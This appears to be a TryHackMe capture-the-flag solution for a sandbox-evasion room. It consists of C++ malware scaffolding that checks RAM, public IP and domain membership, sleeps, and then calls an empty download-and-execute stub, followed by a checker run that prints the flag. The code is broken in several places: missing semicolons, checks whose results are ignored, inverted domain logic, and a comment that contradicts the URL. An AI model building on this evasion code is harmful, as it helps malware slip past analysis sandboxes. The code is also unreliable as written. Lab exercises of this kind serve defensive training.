# Room Informatioon

# Room Task 

## The Great Escape

```CPP
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")

// Check if the system memory is greater than 1GB of RAM
BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

// Implement an outbound HTTP request to 10.10.10.10
BOOL checkIP() 
{
    const char* websiteURL = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    if (s == "10.10.10.10") {
        return TRUE;
    }
    else {
        return FALSE;
    }   
}

// Check and see if the device is joined to an Active Directory Domain
BOOL isDomainController() {
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    if(dcNewName.find("\\")) {
        return FALSE;
        
    }
    else {
        return TRUE;
    }
}

downloadAndExecute()
{
    // INSER MALICIOUS CODE HERE
    return 0;
}

int main() {
    memoryCheck()
    checkIP() 
    isDomainController()
    // Implement a 60-second sleep timer before your payload is retrieved from your web server
    sleep(60000);
    downloadAndExecute();
    return 0;
}


```

```PowerShell
C:\Users\Administrator>C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe C:\Users\Administrator\Desktop\SandboxEvasion.cpp
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag: THM{6c1f95ec}
```
